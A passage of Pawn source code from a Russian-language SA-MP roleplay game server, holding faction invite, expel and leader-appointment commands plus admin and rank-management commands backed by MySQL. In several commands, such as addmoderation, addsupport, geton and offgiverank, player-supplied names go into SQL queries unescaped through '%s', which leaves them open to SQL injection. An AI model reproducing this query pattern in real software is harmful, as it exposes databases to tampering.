		    if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, " Игрок в машине!");
			if(PTEMP[para1][pMember] != 0) return SCM(playerid, COLOR_GREY,  "Игрок состоит в организации");
			if(PTEMP[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, " У игрока Warn.");
			GetPlayerName(para1, giveplayer, sizeof(giveplayer));
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, 128, " Вы пригласили %s присоеденится к %s", giveplayer,ftext);
			SCM(playerid, COLOR_BLUE, string);
			format(string, 128, " Вы приглашены в %s лидером %s", GetFracName(PTEMP[playerid][pMember]), sendername);
			SCM(para1, COLOR_BLUE, string);
			PTEMP[para1][pMember] = PTEMP[playerid][pMember];
			PTEMP[para1][pRank] = 1;
			DeletePVar(para1,"Fraction_Duty");
			PTEMP[para1][pJob] = 0;
			PTEMP[para1][pModel] = skinid;
			if(IsAGang(para1) || IsAMafia(para1) || IsABiker(para1)) SpawnPlayer(para1);
			printf("Игрок %s принял %s в %s", Name(playerid), Name(para1), ftext);
			new year, month, day, hour, minute, second;
			getdate(year, month, day);
			gettime(hour, minute, second);
			mysql_format(DATABASE,QUERY,128, "UPDATE `"TABLE_ACCOUNTS"` SET pOnlineLid = '%04i/%02i/%02i %02i:%02i:%02i' WHERE name = '%e'", year, month, day, hour, minute, second, PTEMP[para1][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	}
	return true;
}
CMD:iinvite(playerid, params[])
{
	if(GetPVarInt(playerid, "Fraction_Duty") == 0) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
	new para1;
	if(sscanf(params,"d",para1)) return SCM(playerid, -1, " Введите: /iinvite [id игрока]");
	new ftext[25];
	if(para1 == INVALID_PLAYER_ID || !IsPlayerConnected(para1)) return SCM(playerid, COLOR_GREY, " Игрок не найден!");
	if(PTEMP[para1][pLevel] < 2) return SCM(playerid, COLOR_GREY, " Требуется 2 уровень");
	if(PTEMP[para1][pLeader] > 0) return SCM(playerid, COLOR_GREY, " Нельзя пригласить лидера.");
	if(PTEMP[playerid][pLeader] == 1 || PTEMP[playerid][pMember] == 1 && PTEMP[playerid][pRank] >= 14)
	{
		if(IsAArm(para1) && PTEMP[para1][pRank] >= 3) { ftext = "Полицию ЛС"; ChosenSkin[para1] = 280; }
		else return SCM(playerid, COLOR_GREY, " Этот игрок не отслужил");
	}
	else if (PTEMP[playerid][pLeader] == 2 || PTEMP[playerid][pMember] == 2 && PTEMP[playerid][pRank] >= 9)
	{
		if(IsAArm(para1) && PTEMP[para1][pRank] >= 10 || IsACop(para1) && PTEMP[para1][pRank] >= 5) { ftext = "FBI"; ChosenSkin[para1] = 286; }
		else return SCM(playerid, COLOR_GREY, " Этот игрок не отслужил");
	}
	else if (PTEMP[playerid][pLeader] == 10 || PTEMP[playerid][pMember] == 10 && PTEMP[playerid][pRank] >= 14)
	{
		if(IsAArm(para1) && PTEMP[para1][pRank] >= 3) { ftext = "Полицию СФ"; ChosenSkin[para1] = 280; }
		else return SCM(playerid, COLOR_GREY, " Этот игрок не отслужил");
	}
	else if (PTEMP[playerid][pLeader] == 21 || PTEMP[playerid][pMember] == 21 && PTEMP[playerid][pRank] >= 14)
	{
		if(IsAArm(para1) && PTEMP[para1][pRank] >= 3) { ftext = "Полицию ЛВ"; ChosenSkin[para1] = 280; }
		else return SCM(playerid, COLOR_GREY, " Этот игрок не отслужил");
	}
	else return SCM(playerid,COLOR_GREY," Вам недоступна эта функция!");
	PTEMP[para1][pMember] = PTEMP[playerid][pMember];
	PTEMP[para1][pRank] = 1;
	SendMes(playerid, 0x6AB1FFAA, " Вы пригласили %s присоедениться к %s", PTEMP[para1][pName],ftext);
	SendMes(para1, 0x6AB1FFAA, " Вы были приглашены в %s лидером %s", ftext, PTEMP[playerid][pName]);
	PTEMP[para1][pJob] = 0;
	PTEMP[para1][pModel] = ChosenSkin[para1];
	SetPlayerSkin(para1, PTEMP[para1][pChar][0]);
	SetPVarInt(para1, "Fraction_Duty", 0);
	SetPlayerColor(para1, TEAM_HIT_COLOR);
	new year, month, day, hour, minute, second;
	getdate(year, month, day);
	gettime(hour, minute, second);
	mysql_format(DATABASE,QUERY,128, "UPDATE `"TABLE_ACCOUNTS"` SET pOnlineLid = '%04i/%02i/%02i %02i:%02i:%02i' WHERE name = '%e'", year, month, day, hour, minute, second, PTEMP[para1][pName]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	return 1;
}
CMD:uninvite(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0 || !GetPVarInt(playerid,"Fraction_Duty")) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(sscanf(params, "us[128]",params[0],params[1])) return SCM(playerid, -1, " Введите: /uninvite [id игрока] [причина]");
	if(PTEMP[playerid][pRank] <= PTEMP[params[0]][pRank]) return SCM(playerid, COLOR_GREY, " [Ошибка] Вы не можете уволить этого игрока");
	if(params[0] == playerid) return SCM(playerid,-1," Себя невозможно уволить");
	if(PTEMP[params[0]][pMember] == PTEMP[playerid][pLeader] || PTEMP[params[0]][pMember] == PTEMP[playerid][pMember])
	{
		if(!IsPlayerConnected(params[0])) return true;
		if(!CanUninviteforeach(playerid,params[0])) return true;
		if(PTEMP[params[0]][pMember] <= 0) return true;
		format(YCMDstr, sizeof(YCMDstr), " %s выгнал вас из организации. Причина: %s",Name(playerid),params[1]);
		SCM(params[0], COLOR_BLUE, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " Вы выгнали %s из организации. Причина: %s",Name(params[0]),params[1]);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		SCM(params[0], COLOR_BLUE, " Вы снова гражданский");
		SCM(params[0], COLOR_BLUE, " Рабочий день окончен");
		if(GetPVarInt(params[0],"capture_on"))
		{
			DeletePVar(params[0],"capture_on");
			PlayerTextDrawHide(params[0], Capture[params[0]]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(params[0],INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		if(GetPVarInt(params[0],"mafia_war"))
		{
			DeletePVar(params[0],"mafia_war");
			PlayerTextDrawHide(params[0], Capture[params[0]]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(params[0],INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		if(GetPVarInt(params[0],"biker_capt"))
		{
			DeletePVar(params[0],"biker_capt");
			PlayerTextDrawHide(params[0], Capture[params[0]]);
			DestroyDynamic3DTextLabel(BikerText[params[0]]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(params[0],INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		PTEMP[params[0]][pMember] = 0;
		PTEMP[params[0]][pLeader] = 0;
		PTEMP[params[0]][pJobHeal] = 0;
		PTEMP[params[0]][pRank] = 0;
		DeletePVar(params[0],"Fraction_Duty");
		SetPlayerArmourAC(params[0],0);
		ResetPlayerWeapons(params[0]);
		DelGun(params[0]);
		SpawnPlayer(params[0]);
		SpawnChange[params[0]] = 0;
		SetPlayerColor(params[0], TEAM_HIT_COLOR);
		SetPlayerSkin(params[0], PTEMP[params[0]][pChar][0]);
	}
	return true;
}
CMD:auninvite(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "us[128]",params[0],params[1])) return SCM(playerid, -1, " Введите: /auninvite [playerid] [причина]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PTEMP[params[0]][pMember] == 0 || PTEMP[params[0]][pLeader]) return SCM(playerid, COLOR_GREY, " Игрок не состоит в организации");
	format(YCMDstr, sizeof(YCMDstr), " %s выгнал вас из организации. Причина: %s",Name(playerid),params[1]);
	SCM(params[0], COLOR_BLUE, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Вы выгнали %s из организации. Причина: %s",Name(params[0]),params[1]);
	SCM(playerid, COLOR_BLUE, YCMDstr);
	SCM(params[0], COLOR_BLUE, " Вы снова гражданский");
	SCM(params[0], COLOR_BLUE, " Рабочий день окончен");
	if(GetPVarInt(params[0],"capture_on"))
	{
		DeletePVar(params[0],"capture_on");
		PlayerTextDrawHide(params[0], Capture[params[0]]);
		for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(params[0],INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
	}
	if(GetPVarInt(params[0],"mafia_war"))
	{
		DeletePVar(params[0],"mafia_war");
		PlayerTextDrawHide(params[0], Capture[params[0]]);
		for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(params[0],INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
	}
	if(GetPVarInt(params[0],"biker_capt"))
	{
		DeletePVar(params[0],"biker_capt");
		PlayerTextDrawHide(params[0], Capture[params[0]]);
		DestroyDynamic3DTextLabel(BikerText[params[0]]);
		for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(params[0],INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
	}
	PTEMP[params[0]][pMember] = 0;
	PTEMP[params[0]][pLeader] = 0;
	PTEMP[params[0]][pRank] = 0;
	PTEMP[params[0]][pJobHeal] = 0;
	DeletePVar(params[0],"Fraction_Duty");
	SpawnChange[params[0]] = 0;
	SetPlayerArmourAC(params[0],0);
	ResetPlayerWeapons(params[0]);
	DelGun(params[0]);
	SpawnPlayer(params[0]);
	SetPlayerColor(params[0], TEAM_HIT_COLOR);
	SetPlayerSkin(params[0],PTEMP[params[0]][pChar][0]);
	return true;
}
CMD:gotocar(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /gotocar [carid]");
	new Float:x, Float:y, Float:z;
	GetVehiclePos(params[0], x, y, z);
	SetPlayerVirtualWorld(playerid, GetVehicleVirtualWorld(params[0]));
	if(IsPlayerInAnyVehicle(playerid))
	{
		SetVehiclePos(GetPlayerVehicleID(playerid), x+1,y+1,z);
		return true;
	}
	SetPlayerPos(playerid, x+1, y+1, z);
	return true;
}
CMD:addmoderation(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	new name[32];
	if(sscanf(params, "s[32]d", name, params[0])) return SCM(playerid, -1, " Введите: /addmoderation [ник] [уровень модератора]");
	if((params[0] > 5 || params[0] < 0) && PTEMP[playerid][pAdmin] < 10) return SCM(playerid, COLOR_GREY, " Ошибка. От 0 до 5");
	else if((params[0] > 10 || params[0] < 0) && PTEMP[playerid][pAdmin] > 9) return SCM(playerid, COLOR_GREY, " Ошибка. От 0 до 10");
	
	mysql_format(DATABASE, QUERY, 100, "SELECT `level` FROM `"TABLE_ADMIN"` WHERE `Name` = '%s'", name);
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(r)//cache_num_rows(r))
	{
		new levels = cache_get_field_content_int(0,"level");
		if(levels > PTEMP[playerid][pAdmin]) return SCM(playerid, COLOR_GREY, " Вы не можете понизить этого администратора!");
	}
	SendMes(playerid,0x6495EDFF," Вы установили %s %d уровень администрирования",name,params[0]);
	mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ADMIN" WHERE `name` = '%s'", name);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",17,params[0],name);
	mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ACCOUNTS" WHERE `name` = '%s'", name);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",17,params[0],name);
	printf("Администратор %s назначил %s модератором %i уровня", PTEMP[playerid][pName], name, params[0]);
	return true;
}
CMD:addsupport(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 9) return true;
	new name[32], var;
	if(sscanf(params, "s[32]i", name, var)) return SCM(playerid, -1, " Введите: /addsupport [Ник] [1 - назначить | 0 - снять]");
	//sscanf(params, "s[32]i", name, var);
	new para1 = GetPlayerID(name);
	if(IsPlayerConnected(para1) && para1 != INVALID_PLAYER_ID) {
		if(var == 1) {
			PTEMP[para1][pHelper] = 2;
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '2' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Вы назначили %s[%i] саппортом", name, para1);
		} else {
			PTEMP[para1][pHelper] = 0;
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '0' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Вы сняли %s[%i] с саппорта", name, para1);
		}
	} else {
		if(var == 1) {
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '2' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Вы назначили %s саппортом", name);
		} else {
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '0' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Вы сняли %s с саппорта", name);
		}
	}
	mysql_function_query(DATABASE,QUERY,false,"","");
	SCM(playerid, COLOR_YELLOW2, YCMDstr);
	printf("Администратор %s назначил %s саппортом", PTEMP[playerid][pName], name);
	return true;
}
CMD:setsupport(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5) return true;
	new name[32], var;
	if(sscanf(params, "s[32]i", name, var)) return SCM(playerid, -1, " Введите: /setsupport [Ник] [1 - назначить | 0 - снять]");
	new para1 = GetPlayerID(name);
	if(IsPlayerConnected(para1) && para1 != INVALID_PLAYER_ID) {
		if(var == 1) {
			PTEMP[para1][pHelper] = 1;
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '1' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Саппорт разморожен");
		} else {
			PTEMP[para1][pHelper] = 2;
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '2' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Саппорт заморожен");
		}
	} else {
		if(var == 1) {
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '1' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Саппорт разморожен");
		} else {
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pHelper = '2' WHERE name = '%s'",name);
			format(YCMDstr, sizeof(YCMDstr), " Саппорт заморожен");
		}
	}
	mysql_function_query(DATABASE,QUERY,false,"","");
	SCM(playerid, -1, YCMDstr);
	if(var == 0) printf("Администратор %s заморозил саппорта %s", PTEMP[playerid][pName], name);
	else printf("Администратор %s разморозил саппорта %s", PTEMP[playerid][pName], name);
	return true ;
}
CMD:geton(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[63]",params[0])) return SCM(playerid,COLOR_GREY, " Введите: /geton [name]");
	mysql_format(DATABASE,QUERY, 256, "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'",params[0]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",18,playerid,params[0]);
	return true;
}
CMD:getleader(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /getleader [номер фракции]");
	mysql_format(DATABASE,QUERY, 256, "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `pLeader` = '%i'",params[0]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",19,playerid,params[0]);
	return true;
}
CMD:makeleader(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new para1,level;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",para1,level)) return SCM(playerid, -1, " Введите: /makeleader [id игрока] [Number(1-33)]");
	if(level > 33 || level < 0) { SCM(playerid, COLOR_GREY, " Нельзя меньше 0 или больше 29!"); return true; }
	if(!IsPlayerConnected(para1)) return true;
	if(level == 0)
	{
		PTEMP[para1][pRank] = 0;
		PTEMP[para1][pMember] = 0;
		PTEMP[para1][pLeader] = 0;
		if(GetPVarInt(para1,"capture_on") || GetPVarInt(para1,"mafia_war"))
		{
			DeletePVar(para1,"capture_on"); DeletePVar(para1,"mafia_war");
			PlayerTextDrawHide(para1, Capture[para1]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(para1,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		if(GetPVarInt(para1,"mafia_war"))
		{
			DeletePVar(para1,"mafia_war");
			PlayerTextDrawHide(para1, Capture[para1]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(para1,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		if(GetPVarInt(para1,"biker_capt"))
		{
			DeletePVar(para1,"biker_capt");
			PlayerTextDrawHide(para1, Capture[para1]);
			DestroyDynamic3DTextLabel(BikerText[para1]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(para1,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		SpawnChange[para1] = 1;
		SCM(para1, 0x6AB1FFAA," Рабочий день окончен");
		SendMes(para1, 0x6AB1FFAA, " Администратор %s назначил вас контролировать данную организацию",Name(playerid));
		SendMes(playerid,0x6AB1FFAA, " Вы назначили %s контролировать фракцию 0",Name(para1));
		SetPlayerArmourAC(para1,0);
		SetPlayerHealthAC(para1,100);
		PTEMP[para1][pSpawnChange][1] = 1;
		PTEMP[para1][pHP] = 100;
		SetPlayerToTeamColor(para1);
		DelGun(para1);
		DeletePVar(para1,"Fraction_Duty");
		return SpawnPlayer(para1);
	}
	if(PTEMP[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, " У игрока имеется предупреждение (warn)");
	if(PTEMP[para1][pLeader] == 0 && PTEMP[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, " Игрок состоит во Фракции / Банде!");
	if(level == 1){ PTEMP[para1][pRank] = 14; InviteSkin[para1] = 283; } //Police Force
	else if(level == 2) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 166; } //FBI
	else if(level == 3) { PTEMP[para1][pRank] = 15; InviteSkin[para1] = 287; } //Army
	else if(level == 4) { PTEMP[para1][pJobHeal] = 1; PTEMP[para1][pRank] = 10; InviteSkin[para1] = 70; } //Ambulance
	else if(level == 5) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 113; } //La Cosa Nostra
	else if(level == 6) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 120; } //Yakuza
	else if(level == 7) { PTEMP[para1][pRank] = 6; InviteSkin[para1] = 147; } //Goverment
	else if(level == 8) { SCM(playerid,COLOR_GREY," За казино отвечают мафии."); return true; } //Casino
	else if(level == 9) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 261; } //News Reporters
	else if(level == 10) { PTEMP[para1][pRank] = 14; InviteSkin[para1] = 283; } //SFPD
	else if(level == 11) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 240; } //Driving/Flying School
	else if(level == 12) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 104; } //Ballas
	else if(level == 13) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 110; } //Vagos
	else if(level == 14) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 125; } //Russian Mafia
	else if(level == 15) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 270; } //Groove
	else if(level == 16) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 261; } //News Reporters
	else if(level == 17) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 115; } //Aztecas
	else if(level == 18) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 173; } //Rifa
	else if(level == 19) { PTEMP[para1][pRank] = 15; InviteSkin[para1] = 287; } //Army
	else if(level == 20) { PTEMP[para1][pRank] = 10; InviteSkin[para1] = 261; } //News Reporters
	else if(level == 21) { PTEMP[para1][pRank] = 14; InviteSkin[para1] = 283; } //LVPD
	else if(level == 22) { SCM(playerid,COLOR_GREY," Данная фракция отсуствует"); return true; }//PTEMP[para1][pRank] = 10; InviteSkin[para1] = 70; } //Медики
	else if(level == 23) { SCM(playerid,COLOR_GREY," Данная фракция отсуствует"); return true; }//Police Force
	else if(level == 24) { PTEMP[para1][pRank] = 9; InviteSkin[para1] = 100; } // Hell's Angels
	else if(level == 25) { SCM(playerid,COLOR_GREY," Данная фракция отсуствует"); return true; } //Police Force
	else if(level == 26) { PTEMP[para1][pRank] = 9; InviteSkin[para1] = 100; } //Warlock
	else if(level == 27) { SCM(playerid,COLOR_GREY," Данная фракция отсуствует"); return true; } //Police Force
	else if(level == 28) { SCM(playerid,COLOR_GREY," Данная фракция отсуствует"); return true; } //Police Force
	else if(level == 29) { PTEMP[para1][pRank] = 9; InviteSkin[para1] = 100; } //Pagans
	//else if(level == 30) { SCM(playerid,COLOR_GREY," Данная фракция отсуствует"); return true; } //Police Force
	//else if(level == 31) { SCM(playerid,COLOR_GREY," Данная фракция отсуствует"); return true; } //Police Force
	//else if(level == 32) { SCM(playerid,COLOR_GREY," Данная фракция отсуствует"); return true; } //Police Force
	//else if(level == 33) { SCM(playerid,COLOR_GREY," Данная фракция отсуствует"); return true; }//{ PTEMP[para1][pJobHeal] = 3; PTEMP[para1][pRank] = 10; InviteSkin[para1] = 70; } //Ambulance
	PTEMP[para1][pLeader] = level;
	PTEMP[para1][pMember] = level;
	PTEMP[para1][pJob] = 0;
	SCM(para1, 0x6AB1FFAA," Рабочий день окончен");
	format(YCMDstr, sizeof(YCMDstr), " Администратор %s назначил вас контролировать данную организацию",Name(playerid));
	SCM(para1, 0x6AB1FFAA, YCMDstr);
	SpawnChange[para1] = 1;
	format(YCMDstr, sizeof(YCMDstr), " Вы назначили %s контролировать фракцию %i",Name(para1),level);
	SCM(playerid,0x6AB1FFAA, YCMDstr);
	PTEMP[para1][pModel] = InviteSkin[para1];
	SetPlayerArmourAC(para1,0);
	SetPlayerHealthAC(para1,100);
	PTEMP[para1][pHP] = 100;
	SetPlayerToTeamColor(para1);
	SetPlayerSkin(para1, InviteSkin[para1]);
	SetPVarInt(para1,"Fraction_Duty",1);
	PTEMP[playerid][pSpawnChange][1] = 1;
	SpawnPlayer(para1);
	new year, month, day, hour, minute, second;
	getdate(year, month, day);
	gettime(hour, minute, second);
	mysql_format(DATABASE,QUERY,128, "UPDATE `"TABLE_ACCOUNTS"` SET pOnlineLid = '%04i/%02i/%02i %02i:%02i:%02i' WHERE name = '%e'", year, month, day, hour, minute, second, PTEMP[para1][pName]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	printf("Администратор %s назначил %s контролировать организацию: %i", PTEMP[playerid][pName], PTEMP[para1][pName], level);
	return true;
}
CMD:demote(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(GetPVarInt(playerid, "Fraction_Duty") == 0) return SCM(playerid, COLOR_GREY, " Функция доступна Мэру и ФБР с 6 ранга");
	if(PTEMP[playerid][pMember] != 2 && PTEMP[playerid][pMember] != 7) return SCM(playerid, COLOR_GREY, " Функция доступна Мэру и ФБР с 6 ранга");
	if(PTEMP[playerid][pMember] == 2 && PTEMP[playerid][pRank] < 6) return SCM(playerid, COLOR_GREY, " Доступно с 6 ранга");
	if(PTEMP[playerid][pMember] == 7 && PTEMP[playerid][pRank] < 6) return SCM(playerid, COLOR_GREY, " Функция доступна Мэру и ФБР с 6 ранга");
	new para1, reason[32], str[128];
	if(sscanf(params, "us[32]", para1, reason)) return SCM(playerid, -1, " Введите: /demote [id] [Причина]");
	new playerName[32], paraName[32];
	GetPlayerName(playerid, playerName, sizeof(playerName));
	GetPlayerName(para1, paraName, sizeof(paraName));
	if(PTEMP[para1][pMember] == 1 || PTEMP[para1][pMember] == 10 || PTEMP[para1][pMember] == 21)
	{
		if(PTEMP[para1][pRank] > 10) return SCM(playerid, COLOR_GREY, " Человек имеет ранг больше 10");
		if(PTEMP[para1][pRank] > 1)
		{
		    PTEMP[para1][pRank] -= 1;
		    if(PTEMP[playerid][pMember] == 2)
				format(str, sizeof(str), " Агент ФБР %s понизил вас до %i ранга. Причина: %s", playerName, PTEMP[para1][pRank], reason);
			else if(PTEMP[playerid][pMember] == 7)
				format(str, sizeof(str), " Мэр %s понизил вас до %i ранга. Причина: %s", playerName, PTEMP[para1][pRank], reason);
			SCM(para1, COLOR_BLUE, str);
			format(str, sizeof(str), " Вы понизили %s до %i ранга. Причина: %s", paraName, PTEMP[para1][pRank], reason);
			SCM(playerid, COLOR_BLUE, str);
		}
		else if(PTEMP[para1][pRank] == 1)
		{
		    PTEMP[para1][pMember] = 19;
		    PTEMP[para1][pRank] = 4;
		    PTEMP[para1][pModel] = 287;
			SetPVarInt(para1, "Fraction_Duty", 1);
			SpawnPlayer(para1);
			SetPlayerToTeamColor(para1);
		    if(PTEMP[playerid][pMember] == 2)
				format(str, sizeof(str), " Агент ФБР %s перевёл вас обратно в армию. Причина: %s", playerName, reason);
			else if(PTEMP[playerid][pMember] == 7)
				format(str, sizeof(str), " Мэр %s перевёл вас обратно в армию. Причина: %s", playerName, reason);
			SCM(para1, COLOR_BLUE, str);
			format(str, sizeof(str), " Вы перевели %s обратно в армию. Причина: %s", paraName, reason);
			SCM(playerid, COLOR_BLUE, str);
		}
	}
	else if(PTEMP[para1][pMember] == 3 || PTEMP[para1][pMember] == 19)
	{
	    if(PTEMP[para1][pRank] > 10) return SCM(playerid, COLOR_GREY, " Человек имеет ранг больше 10");
	    if(PTEMP[para1][pRank] > 1)
		{
		    PTEMP[para1][pRank] -= 1;
		    if(PTEMP[playerid][pMember] == 2)
				format(str, sizeof(str), " Агент ФБР %s понизил вас до %i ранга. Причина: %s", playerName, PTEMP[para1][pRank], reason);
			else if(PTEMP[playerid][pMember] == 7)
				format(str, sizeof(str), " Мэр %s понизил вас до %i ранга. Причина: %s", playerName, PTEMP[para1][pRank], reason);
			SCM(para1, COLOR_BLUE, str);
			format(str, sizeof(str), " Вы понизили %s до %i ранга. Причина: %s", paraName, PTEMP[para1][pRank], reason);
			SCM(playerid, COLOR_BLUE, str);
		}
		else if(PTEMP[para1][pRank] == 1)
		{
            PTEMP[para1][pMember] = 0;
			PTEMP[para1][pRank] = 0;
			PTEMP[para1][pJob] = 0;
			SetPlayerArmourAC(para1,0);
			SetPlayerColor(para1, TEAM_HIT_COLOR);
			SpawnPlayer(para1);
			SCM(para1, COLOR_BLUE, " Рабочий день окончен");
		    if(PTEMP[playerid][pMember] == 2)
				format(str, sizeof(str), " Агент ФБР %s уволил вас из армии. Причина: %s", playerName, reason);
			else if(PTEMP[playerid][pMember] == 7)
				format(str, sizeof(str), " Мэр %s уволил вас из армии. Причина: %s", playerName, reason);
			SCM(para1, COLOR_BLUE, str);
			format(str, sizeof(str), " Вы уволили %s из армии. Причина: %s", paraName, reason);
			SCM(playerid, COLOR_BLUE, str);
		}
	}
	else SCM(playerid, COLOR_GREY, " Игрок не состоит в Армии / ПД");
	return true;
}
CMD:offgiverank(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pLogin] == 0 || PTEMP[playerid][pLeader] == 0) return true;
	new params_name[24], params_rank;
	if(sscanf(params, "s[24]d", params_name, params_rank)) return SCM(playerid, -1, " Введите: /offgiverank [Имя] [Ранг]");
	mysql_format(DATABASE, QUERY, 62, "SELECT * FROM "TABLE_ACCOUNTS" WHERE Name='%e' and pMember = '%d'", params_name,PTEMP[playerid][pMember]);
	new Cache:result = mysql_query(DATABASE, QUERY);
	if(cache_num_rows())
	{
		switch(PTEMP[playerid][pMember])
		{
		    case 1,10,21:
			{
				switch(params_rank) { case 1..13: {} default: { return SCM(playerid, COLOR_GREY, " Нельзя меньше 1 и больше 13"); } }
			}
		    case 2,4,5,6,9,11,12,13,14,15,16,17,18,20,24,26,29:
			{
	            switch(params_rank) { case 1..9: {} default: { return SCM(playerid, COLOR_GREY, " Нельзя меньше 1 и больше 9"); } }
			}
		    case 3,19:
			{
			    switch(params_rank) { case 1..14: {} default: { return SCM(playerid, COLOR_GREY, " Нельзя меньше 1 и больше 14"); } }
			}
		    case 7:
			{
				switch(params_rank) { case 1..9: {} default: { return SCM(playerid, COLOR_GREY, " Нельзя меньше 1 и больше 9"); } }
			}
		}
		SendMes(playerid,COLOR_BLUE," Вы понизили/повысили %s до %d ранга",params_name,params_rank);
		mysql_format(DATABASE,QUERY, 256, "UPDATE "TABLE_ACCOUNTS" SET pText = '10', pRank = '%i' WHERE name = '%s'",params_rank, params_name);
		mysql_function_query(DATABASE,QUERY,false,"","");
		format(YCMDstr, sizeof(YCMDstr), " Лидер %s[%i] offGiveRank %s : %i ранг", Name(playerid), playerid, params_name, params_rank);
		ABroadCast(COLOR_YELLOW, YCMDstr, 3);
		printf(YCMDstr);
	}
	else SCM(playerid, COLOR_GREY, " Ошибка: Игрок не в вашей фракции");
	return cache_delete(result, DATABASE);
}
CMD:anim(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1) return true;
